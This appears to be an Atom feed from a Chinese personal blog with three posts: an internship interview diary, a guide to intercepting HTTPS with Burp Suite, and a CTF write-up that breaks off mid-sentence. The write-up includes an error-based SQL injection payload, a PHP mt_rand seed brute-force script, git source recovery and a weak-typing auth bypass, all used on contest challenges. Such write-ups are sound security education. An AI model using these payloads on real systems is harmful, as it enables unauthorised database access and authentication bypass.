<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>信鑫-King&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.ycjcl.cc/"/>
  <updated>2018-07-08T15:53:48.000Z</updated>
  <id>https://www.ycjcl.cc/</id>
  
  <author>
    <name>Kylin King</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2017年春招实习面试记录</title>
    <link href="https://www.ycjcl.cc/2018/07/08/2017%E5%B9%B4%E6%98%A5%E6%8B%9B%E5%AE%9E%E4%B9%A0%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%95/"/>
    <id>https://www.ycjcl.cc/2018/07/08/2017年春招实习面试记录/</id>
    <published>2018-07-08T15:49:12.000Z</published>
    <updated>2018-07-08T15:53:48.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>时间过得好快，一转眼各大公司的春招实习又正式地拉开帷幕，自己去年春招找实习的场景还历历在目，大概是运气比较好，收获了阿里、腾讯、美团、网易游戏四家实习offer。抛开技术相关问题，分享下整个春招经历以及面试的一些技巧。</p></blockquote><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>首先科普下春招实习与普通实习的区别？(<a href="https://www.zhihu.com/question/270602481/answer/355531732" target="_blank" rel="noopener">参考知乎</a>)</p><ol><li>春招实习是公司正式项目，实习的时间大多是在大三下暑假，一般会有留用机会。</li><li>普通实习的时间大都是<strong>立即到岗</strong>，留用机会也会比较少。</li><li>春招实习多数是有房补的，而<strong>普通实习无房补</strong>。</li></ol><h2 id="0x01-寒假准备"><a href="#0x01-寒假准备" class="headerlink" title="0x01 寒假准备"></a>0x01 寒假准备</h2><p>参照以往的经历，春招会在春节前后陆续进行，因此 <strong>大三寒假准备就显得至关重要</strong> 。</p><p>寒假期间，不断完善简历（<span data-type="color" style="color:#F5222D;">大多数面试题来源于简历</span>），时刻关注各公司的春招实习以及平常实习的招聘信息，提前找好学长学姐内推各家】公司（<span data-type="color" style="color:#F5222D;">内推非常非常非常重要</span>）。</p><p>2月16号，上午10点美团一面，晚上7点腾讯课堂一面（<strong>美团和腾讯课堂都是普通实习，需立即到岗的</strong>）。面试都挺顺利，和面试官聊得也挺愉快，能不能过一面，心里大概知道个七八分。（<strong>面试有点像是恋爱，关键看能否聊到一起</strong>）。</p><p>2月17号，时隔一天，上午10:52腾讯二面，11:27美团二面，下午2:00腾讯三面共享桌面编程，下午3:18美团三面，晚上10点腾讯课堂四面。美团二三面感觉问得挺深入，有一些没有答出来，心里没底。腾讯二三四面挺顺利，明天安排主管面。</p><p>这一天手机是相当地繁忙，一个电话接着一个电话，美团和腾讯面试交替进行。（面试电话是通过公司分机打出来的，存到通讯录里，这样电话打过来，一眼就知道哪家公司）<br><img src="https://cdn.yuque.com/yuque/2018/png/85694/1522242728112-452b7abc-c3b8-4757-9934-abc1bda7cbd6.png" alt="image.png | left | 281x462"></p><p>2月18号，上午以为美团会挂掉，腾讯过得几率会大，结果中午美团hr通知我面试通过了，什么时候能来实习？当时不是很确定，想着等腾讯面完再决定实习时间。（hr小姐姐们都挺好，<strong>实习时间都是可以商量的</strong>）</p><p>18号晚上9点，腾讯课堂主管面，主管全程没怎么说话，很冷的那种，首先让我来一个自我介绍（<strong>这个应该是每个面试必问的第一个问题，回答的多了我都可以背下来</strong>），我从他那得不到反馈，并组当天晚上家里下起了暴雨，通话效果相当差，聊得不是很好。（所以电话面试一定要找个安静的、没有什么干扰的地方）</p><p>主管最后说：有什么问题问他？</p><p>这是每个面试最后都有的问题，<span data-type="color" style="color:#F5222D;"><strong>一定要抓住最后一个问题</strong></span>，因为从这个问题，可以获取这次面试反馈以及团队研究方向。</p><p>然后我就问：</p><ol><li>对我此次面试的评价，哪里答得不好、有什么建议？</li><li>团队是偏向业务还是偏向基础技术？（简单地讲，业务就是用轮子、基础技术就是造轮子，各有各的好，看各人爱好了）</li></ol><p>主管说这个要经过讨论，部门主要偏向业务，业余时间会做些基础建设。听到这后，基本就知道过不了了。结果也是如此，<br>最后决定3月13号去北京美团实习，这时候寒假结束，各个厂的春招实习内推开始了，找学长们内推了阿里、腾讯、网易游戏。</p><h2 id="0x02-忙碌的面试"><a href="#0x02-忙碌的面试" class="headerlink" title="0x02 忙碌的面试"></a>0x02 忙碌的面试</h2><p>最先接到的是网易游戏，当时在学校找了个没人的教室进行电话面试，聊的非常愉快，聊完就确定会有下一面。此时阿里的状态从「简历评估中」变成了「面试中」，表示简历被部门捞起来，也就这几天要面试了。</p><h3 id="网易游戏"><a href="#网易游戏" class="headerlink" title="网易游戏"></a>网易游戏</h3><p>一天后，网易游戏发通知，邀请3月3号周五到杭州网易总部面试，报销来往路费。抱着去杭州旅行的心态，买了机票、订了酒店。<br>去线下面还是挺紧张的，毕竟第一次线下面试。早早来了面试大厅，单人单桌面对面交流。<img src="https://cdn.yuque.com/yuque/2018/png/85694/1523283183972-b39569c4-7b49-41e8-82b2-b111ddf76b0a.png" alt="image.png | left | 358x409"></p><p>网易游戏线下面试会分上午、下午两轮，午饭过后会通知进入到下午面试的人。（如果上午没通过的话，也就没下午那场了，面试还是挺残酷的）<img src="https://cdn.yuque.com/yuque/2018/jpeg/85694/1523327745935-47d914aa-3650-462a-856b-feb25471e314.jpeg" alt="2017-03-03 085132(1).jpg | left | 748x561"></p><p>上午面完，聊了很多基础知识（能感觉是业务部门，基础技术的研究会偏少），大体都能hold住，能不能进到下午的面试，面试官没明确。面完后，内推我的学长带我到猪厂餐厅尝了尝（猪厂餐厅名不虚传）<img src="https://cdn.yuque.com/yuque/2018/png/85694/1523327930667-76419d9e-147b-4e00-83d3-90d014f37105.png" alt="1523081562073-679a847f-ac3d-4fb2-adf3-c56933096813.png | left | 433x325"></p><p>吃完1点半左右，到了面试大厅，这时候hr小姐姐公布进入下午面试名单，念的第一个就是我的名子，有点不知所措。（不知道与面试评级挂不挂钩）</p><p><img src="https://cdn.yuque.com/yuque/2018/jpeg/85694/1523324933414-88739961-54f6-442d-9745-c110f65a817f.jpeg" alt="G2U1GS](Y.jpg | center | 120x111"></p><p>下午主管面，问题相对开放，主要考察技术的广度、解决问题的思路以及对技术的热爱程度（<strong>热爱不是写上去或者说说而已，是通过自身学习经历让面试官感受到的</strong>）。</p><p>我本来在纸质简历上将『你画我猜』小游戏去掉了，因为要是问起网络协议与游戏相关，可能答得不会太深入。但主管拿到的那份简历是系统里没改过的，当时问得我有点惊，毕竟自己亲手做的项目，还好问题基本能答上来。（<strong>一定要将自己最擅长、最有把握的项目和技术写到简历上，这样回答才不会自乱手脚</strong>）</p><p>下午面完后，面试就结束了，hr小姐姐让回去等通知就好。周五这一天的面试还挺顺利。</p><p>刚好赶上周末，到西湖转了转，晚上住在文三路如家酒店（支付宝大楼背后）。</p><p><img src="https://cdn.yuque.com/yuque/2018/png/85694/1523282969514-90da5f9b-3b5d-466f-8288-0b6f62e0530d.png" alt="image.png | left | 358x477"></p><h3 id="支付宝"><a href="#支付宝" class="headerlink" title="支付宝"></a>支付宝</h3><p>说起来真是巧，周天晚上在支付宝大楼背后的如家酒店里，接到了一面电话。一面问的也是比较基础的，但在基础上进行深入上，大体是按简历从上到下的顺序问的，很多问题之前也有面试官问过。（<strong>同一份简历的面试题会随着面试次数的增多，会出现一些相同的题</strong>）</p><p>一听我现在就在支付宝大楼背后，想让我明天早上9点到现场面试。由于和返校航班时间冲突，所以没能现场面。面完一面后，看状态由『简历评估中』变成了『面试中』。</p><p>3月9号周四上午，给安排视频面试，第一次视频面，面试问题也是比较开放的（<strong>根据自己理解去答，能想到多少说多少）</strong>。面完后感觉挺好，就问了面试官，还有后面技术还有几面。面试官回答后面没技术面了，就hr面。（<strong>可能是一面视频面或现场可以抵好几面电话的缘故吧</strong>）。</p><p>上午一面完，中午就收到了hr视频面试邀约，当时正准备到教室上课，一看到hr要视频面了，立马跑回宿舍开视频😂。hr面试就谈谈自己的学习经历和未来规划，这些只要价值观正常，基本都可以聊得挺好。hr其中提到了我在前端领域之外，创业拿过融资、学习过网络安全，特意让我讲了讲。（<strong>与众不同，也许能更能被发现吧！就像上次聚餐时，一大神就提到，现在简历大部分写的Vue，要是有一份简历出现了Angular或React，顿时就让人眼前一亮。</strong>）</p><p>hr面完后，状态一直是『面试中』， 一直持续到4月底，参考我的回答 <a href="https://www.zhihu.com/question/56263411/answer/150573239" target="_blank" rel="noopener">2018 届阿里实习生内推实况是怎样的？</a>。​（<strong>一般情况下，只要状态是『面试中』就表示没挂掉，是有希望的。</strong>）</p><h3 id="腾讯音乐"><a href="#腾讯音乐" class="headerlink" title="腾讯音乐"></a>腾讯音乐</h3><p>因为之前到美团的实习是 3月13号周一 到岗，所以买了3月10号周五当天上午的机票。当我登机后发现和 彭于晏 同一趟航班时（可惜没要到签名），知道3月10号这一天不平常。<br><img src="https://cdn.yuque.com/yuque/2018/png/85694/1523285511469-c41191d8-02d3-4d08-8411-c4aa8aba8afb.png" alt="image.png | left | 294x290"></p><p>下了飞机，刚把行李放到麦香学长那，腾讯的一面电话就来了，电话来得有点突然。我说给我十分钟时间，我准备下（<strong>在当前没有面试环境和状态时，可以和面试官商量协调面试时间</strong>），十分钟里，我洗把脸，准备好耳机，调整心态，然后就开始和面试官聊天了。腾讯的面试问题有点特别，之前没有遇到过，面试题会更加创新性地问你，一面开始就面得很开放，一题多解。就这样，面完后，基本能确定能进入下一轮面试。</p><p>腾讯的面试、美团的实习、学校的课程（这自己想办法吧，和老师、同学协调好）基本是同时进行，此时也没有投其它家。13号周一就入职美团了，美团技术氛围相当好，实习生也给发 MacBook Pro15，所在团队的技术栈也是比较新，写起来很舒服。<img src="https://cdn.yuque.com/yuque/2018/png/85694/1523286019418-fd6111a6-fdde-4b89-b46f-e8c426136f2f.png" alt="image.png | left | 380x266"></p><p>腾讯面试基本上保持每周一面频率进行，3月18号(周六)上午10点，技术二面（<strong>当天网易游戏的offer邮件下来了，心里没什么压力，至少暑假有地去了</strong>）。3月21号晚上7点半，技术三面。三面完后，音乐的主管说给我安排了HR面，心里觉得应该快差不多了。（<strong>腾讯HR面一般不会挂人</strong>）</p><p>等了一个星期，都没有接到hr面，又问了主管，主管说学校非公司目标院校，需要在3月27号下午3点加一个面试委员会面试（面试委员会是腾讯集团从各BU抽人成立的一个，对非目标院校的面试者进行double check），当时面我的是腾讯云BU的，简单聊了聊服务器、后台相关，又问了问未来规划。从面试过程，感觉能过。</p><p>过了一个小时，进行hr面试，面完后并没有直接发offer，说需要线下线路面试的时候再看看，让我不用参加4月2号的笔试了。（刚好27号是腾讯内推面试的最后一天，线路面试是腾讯线下来各大城市进行当场面试，会包下整个酒店面试大概2天）</p><p>音乐的主管本来安排在广州线路上，主动要求到北京线路面试，说是为了当面和我聊一聊。<br>4月17号下午到了面试的酒店，周围坐的都是来面试的人，压力一下大了不少。主管面完其他同学后，就单独和我聊了聊，主要聊了聊在美团的实习和我原来做过的项目（<strong>有实习经历、项目经历在面试中就有话题可聊，优势就会大不少</strong>），聊完后，主管说他联系下hr，安排我走剩下的流程。当时我顺口问了一句，为什么面了这么多面？主管说因为这个岗位只有一个hc。我当时真的好幸运。</p><p>听到这句话，真的好开心，终于有了BAT中的一家offer了。离开酒店，在回望京的地铁上，查了查状态，由『HR面试中』变成了『你已完成所有面试环节』，晚上和麦香学长、chu学长和学姐还有大厨一起吃晚饭，心里真的超开心。参考我的回答 <a href="https://www.zhihu.com/question/57031576/answer/152938753" target="_blank" rel="noopener">2018 届腾讯实习生内推实况是怎样的？</a><img src="https://cdn.yuque.com/yuque/2018/png/85694/1523286948135-4ac88135-22d7-40b9-a9dc-29cd6a1ca41b.png" alt="image.png | left | 453x379"></p><p>至今想起来，3月、4月真是忙碌，一边是美团的实习、一边是腾讯的面试、一边是学校课程。所以建议每顿给自己加个鸡腿🍗和煎蛋🥚，补充能量更好地面试。</p><h2 id="0x03-“幸福”的烦恼"><a href="#0x03-“幸福”的烦恼" class="headerlink" title="0x03 “幸福”的烦恼"></a>0x03 “幸福”的烦恼</h2><p>当时发offer的时间顺序：3月17号—网易游戏，4月17号—腾讯音乐，4月24号—支付宝。网易游戏offer在腾讯offer下来之后就发邮件拒掉了。腾讯的offer是需要3天内要确认回执，当时阿里没有消息，但感觉能过（<strong>阿里面试就这个感觉，感觉会有，却不敢肯定和确定</strong>）。</p><p>当时一心想去腾讯，一是腾讯offer发的比较早，二是腾讯转正率高，这个职位只招了一个实习生留用也是稳稳的，三是从小到大对深圳的向往。</p><p>但阿里的offer一下来，就犹豫了，开始动摇，当时纠结的主要有两点：</p><ol><li>阿里转正率不高，到时候要是不能转正，转正结果公布较慢会影响秋招。</li><li>已经接了腾讯的offer，主管花了这么大心思和代价，拒掉挺不忍心，也不太仁道，这话真不知怎么开口。</li><li>有一些个人原因</li></ol><p>所以当时在知乎上提了一个问题：<a href="https://www.zhihu.com/question/58937169" target="_blank" rel="noopener">前端实习offer比较: 腾讯，阿里，网易游戏?</a></p><p>回答超半数建议去支付宝，技术上更好的发展是主要理由吧。问了好多学长学姐，大部分也建议去支付宝锻炼锻炼，纠结近半个月后，我做出了一个艰难的决定，<strong>实习去支付宝，赌一把。</strong>现在看来，是赌赢了，去了网红部门。</p><p>此时，美团的实习也基本快结束，和主管说了情况，主管也挺理解，谢谢主管。</p><p>春招实习也就告一段落了，回校考完试就去了杭州实习。</p><p><img src="https://cdn.yuque.com/yuque/2018/png/85694/1523288949463-8d4a099b-0442-40c8-9d43-74b4e3246cc6.png" alt="image.png | left | 547x412"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;时间过得好快，一转眼各大公司的春招实习又正式地拉开帷幕，自己去年春招找实习的场景还历历在目，大概是运气比较好，收获了阿里、腾讯、美团、网易游戏四家实习offer。抛开技术相关问题，分享下整个春招经历以及面试的一些技巧。&lt;/p&gt;
&lt;/blockquo
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Firefox+burpsuite抓取https的正确姿势</title>
    <link href="https://www.ycjcl.cc/2018/07/08/Firefox+burpsuite%E6%8A%93%E5%8F%96https%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF/"/>
    <id>https://www.ycjcl.cc/2018/07/08/Firefox+burpsuite抓取https的正确姿势/</id>
    <published>2018-07-08T15:48:25.000Z</published>
    <updated>2018-07-08T15:48:53.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>坑了好久，抓取成功与否，与 java版本、证书、firefox配置息息相关。</p></blockquote><h2 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h2><ul><li>java 1.7以下，我用的 1.6<br>一定要1.7以下，如果1.7 firefox 以上会提示 <code>The client failed to negotiate an SSL connection to no cipher suites in common</code></li></ul><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h4 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h4><p>burpsuite 则在 Proxy -&gt; Options 里，设置端口<br>firefox 里在 Preferences -&gt; Advanced -&gt; Network 配置与 burpsuite 相同的ip和端口，记住勾选上应用到所有协议。<img src="https://cdn.yuque.com/yuque/2018/png/85694/1523430166991-42b8dab7-8eb2-45b3-899a-6cb0caacc94d.png" alt="image.png | left | 720x376"></p><h4 id="安装证书"><a href="#安装证书" class="headerlink" title="安装证书"></a>安装证书</h4><p>地址栏访问：<a href="http://burp" target="_blank" rel="noopener">http://burp</a>  点击 CA Certificate 下载证书。<img src="https://cdn.yuque.com/yuque/2018/png/85694/1523430098907-a8971389-83bf-4069-9b1e-006269351270.png" alt="image.png | left | 748x321"></p><p>然后在 Preferences -&gt; Advanced -&gt; Certificates -&gt; Security Devices -&gt; Authorities ，导入下载的证书，勾选信任。<br><img src="https://cdn.yuque.com/yuque/2018/png/85694/1523430693539-8c09d026-9a77-4105-ab1c-bd01d846f4eb.png" alt="image.png | left | 554x255"></p><h4 id="配置firefox"><a href="#配置firefox" class="headerlink" title="配置firefox"></a>配置firefox</h4><p>地址栏访问 <code>about:config</code> ，找到 <code>security.ssl3.dhe_rsa_aes_128_sha</code> 和 <code>security.ssl3.dhe_rsa_aes_256_sha</code> 将两个设置成 <code>false</code> <img src="https://cdn.yuque.com/yuque/2018/png/85694/1523429980123-2a1d55a5-e65a-4db5-a8c4-92ff47388d71.png" alt="image.png | left | 748x378"></p><h2 id="成功抓取"><a href="#成功抓取" class="headerlink" title="成功抓取"></a>成功抓取</h2><p><img src="https://cdn.yuque.com/yuque/2018/png/85694/1523430506112-efa43095-96f8-4d77-ba5a-22561dcb6fd2.png" alt="image.png | left | 680x456"></p><blockquote><p>之前踩了两个坑，一个是 java 版本过高1.8，导致抓取不了，google好久未能解决。另一个是 firefox ssl 配置不对，也抓取不了。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;坑了好久，抓取成功与否，与 java版本、证书、firefox配置息息相关。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;环境要求&quot;&gt;&lt;a href=&quot;#环境要求&quot; class=&quot;headerlink&quot; title=&quot;环境要求&quot;&gt;&lt;/a&gt;环
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>第三届上海市大学生网络安全大赛WriteUp</title>
    <link href="https://www.ycjcl.cc/2018/07/08/%E7%AC%AC%E4%B8%89%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWriteUp/"/>
    <id>https://www.ycjcl.cc/2018/07/08/第三届上海市大学生网络安全大赛WriteUp/</id>
    <published>2018-07-08T15:47:44.000Z</published>
    <updated>2018-07-08T15:55:53.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>比赛时间是从 11月4日08:00 - 11月5日08:00 ，周末和 Swing 学弟、周师傅 一起打了线上，11月4号晚上还是第三，睡了一觉起来发现第6了。不过进了决赛（前20），18号可以约上海，记录下解题报告WriteUp。</p></blockquote><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/74718587.jpg" alt=""></p><h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p>下载app，加入圈子，查看flag</p><h1 id="Some-Words"><a href="#Some-Words" class="headerlink" title="Some Words"></a>Some Words</h1><p>题目拦截了union,and,=等关键字，但是没有拦截select mid from ascii等关键字，可以利用运算符进行盲注</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/33577521.jpg" alt=""></p><p>但是过于麻烦，可以爆错，那就试试报错注入<br><code>http://cac7cafcbee440438320c8c23ded71a2fb677909ba534c05.game.ichunqiu.com/index.php?id=updatexml(1,concat(0x7e,(select database() limit 1,1),0x7e),1)</code> 得到当前库，然后得到表和列，最后查询flag</p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/44572178.jpg" alt=""></p><p>得到前32位，mid一下得到后面<code>http://cac7cafcbee440438320c8c23ded71a2fb677909ba534c05.game.ichunqiu.com/index.php?id=updatexml(1,concat(0x7e,(select%20mid(f14g,32,100) from f14g  limit 0,1),0x7e),1)</code></p><h1 id="classical"><a href="#classical" class="headerlink" title="classical"></a>classical</h1><p><a href="https://quipqiup.com/" target="_blank" rel="noopener">https://quipqiup.com</a></p><p>替换密码，在上面的链接解决，得到如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">In cryptography, a classical cipher is a type of cipher that was used historically but now has fallen, for the most part, into disuse. In contrast to modern cryptographic algorithms, most classical ciphers can be practically computed and solved by hand. However, LyjtL3fvnSRlo2xvKIjrK2ximSHkJ3ZhJ2Hto3x9 they are also usually very simple to break with modern technology. The term includes the simple systems used since Greek and Roman times, the elaborate Renaissance ciphers, World War II cryptography such as the Enigma machine and beyond. A quick brown fox jump over the lazy dog.</span><br></pre></td></tr></table></figure><p>其中<code>LyjtL3fvnSRlo2xvKIjrK2ximSHkJ3ZhJ2Hto3x9</code>这串字符串应该还有一层加密，猜测是还有一层古典密码，尝试去跑凯撒<br>把凯撒的各种情况跑出来后，进行 <code>base64</code> 解码就能得到 <code>flag</code></p><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/39740735.jpg" alt=""></p><h1 id="Welcome-To-My-Blog"><a href="#Welcome-To-My-Blog" class="headerlink" title="Welcome To My Blog"></a>Welcome To My Blog</h1><p>发现有 <code>.git</code> 目录，尝试恢复git <a href="https://ring0.me/2015/05/recover-code-from-corrupt-git-repo/" target="_blank" rel="noopener">https://ring0.me/2015/05/recover-code-from-corrupt-git-repo/</a><br><a href="http://8fdb0c9fce8c40d28cd083b3719dfa8c35b5b80615034dfe.game.ichunqiu.com/.git/" target="_blank" rel="noopener">http://8fdb0c9fce8c40d28cd083b3719dfa8c35b5b80615034dfe.game.ichunqiu.com/.git/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">printf</span> <span class="string">"\x1f\x8b\x08\x00\x00\x00\x00\x00"</span> | cat - 3207b7443805336f105c63c6f9948f0c9ae7a4 | gunzip | hexdump -C</span><br></pre></td></tr></table></figure><p>得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"function.php"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"action"</span>]))&#123;</span><br><span class="line">  $page = $_GET[<span class="string">"action"</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  $page = <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(file_exists($page.<span class="string">'.php'</span>))&#123;</span><br><span class="line">  $file = file_get_contents($page.<span class="string">".php"</span>);</span><br><span class="line">  <span class="keyword">echo</span> $file;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(@$_GET[<span class="string">"action"</span>]==<span class="string">"album"</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"pid"</span>]))&#123;</span><br><span class="line">     curl($_GET[<span class="string">"pid"</span>]);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现有  <code>flag.php</code>，<br>访问 <code>http://8fdb0c9fce8c40d28cd083b3719dfa8c35b5b80615034dfe.game.ichunqiu.com/index.php?action=flag</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">"flag&#123;149922b5-27da-44b7-92b5-3c1ccfa75264&#125;"</span>;</span><br></pre></td></tr></table></figure><h1 id="Step-By-Step"><a href="#Step-By-Step" class="headerlink" title="Step By Step"></a>Step By Step</h1><p>顺手扫了一下文件，发现有这些文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/robots.txt</span><br><span class="line">/index.php</span><br><span class="line">/file.php</span><br><span class="line">/flag.php</span><br><span class="line">/admin.php</span><br></pre></td></tr></table></figure><p>打开，<code>robots.txt</code> ，里面提示 <code>code.zip</code>  ，然后 down 下来是被 <code>phpjiami</code> 加密代码，然后解密一下，得到三个源文件 <code>index.php</code> 、 <code>admin.php</code> 、 <code>file.php</code>, 进行代码审计<br>首先看一下 <code>index.php</code>，是一个随机种子爆破的漏洞，写了一个爆破脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(‘max_execution_time’, ‘<span class="number">0</span>’);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化seed</span></span><br><span class="line">$seed = <span class="number">0</span>;</span><br><span class="line">$key = <span class="string">'填入index.php返回的key值'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth_code</span><span class="params">($length = <span class="number">12</span>, $special = true)</span> </span>&#123;</span><br><span class="line">    $chars = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    <span class="keyword">if</span> ($special) &#123;</span><br><span class="line">        $chars .= <span class="string">'!@#$%^&amp;*()'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $password = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $password .= substr($chars, mt_rand(<span class="number">0</span>, strlen($chars) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $password;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;=<span class="number">99999</span>; $i++)&#123;</span><br><span class="line">    mt_srand($i);</span><br><span class="line">    $hash1 = auth_code(<span class="number">16</span>, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($hash1 === $key) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"find seeds :"</span>.$i.<span class="string">"\n"</span>;</span><br><span class="line">      $seed = $i;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$pri = auth_code(<span class="number">10</span>, <span class="keyword">false</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'private值为： '</span>.$pri;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-4/64377317.jpg" alt=""></p><p>然后发 index.php 发 post 请求，<code>private=X6B4CdeBOR</code>，此时会提示 <code>No private!</code> ，因为此时session为空，所以第一次会将private存入到session，再发送相同的请求，就会直接跳转到 <code>http://959b616a1c194d4d83f5b75a7a2f7ec6f63163b4fcbe4482.game.ichunqiu.com/admin.php?authAdmin=2017CtfY0ulike</code>。</p><p>再来看下 <code>admin.php</code>， 有一个 <code>json_decode($auth) == $auth_code</code> ，使用 0 进行弱类型绕过。此时出来一个表单，但是点击没有反应，查看js，使用了 ajax 进行提交，可以进行抓包。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  filename = $(<span class="string">"#filename"</span>).val();</span><br><span class="line">  $.ajax(&#123;</span><br><span class="line">    url: <span class="string">'file.php'</span>,</span><br><span class="line">    type: <span class="string">'post'</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">      <span class="string">'id'</span>: filename,</span><br><span class="line">      <span class="string">'auth'</span>: <span class="string">'1234567890x'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    dataType: <span class="string">'text'</span>,</span><br><span class="line">    success: <span class="function"><span class="keyword">function</span>(<span class="params">result</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(result);</span><br><span class="line">    &#125;,</span><br><span class="line">    error: <span class="function"><span class="keyword">function</span>(<span class="params">XMLHttpRequest, textStatus, errorThrown</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(XMLHttpRequest);</span><br><span class="line">      <span class="built_in">console</span>.log(textStatus);</span><br><span class="line">      <span class="built_in">console</span>.log(errorThrown);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时再看下 <code>file.php</code> ，传 id ，字符串需要包含有 <code>jpg</code> 和 满足正则 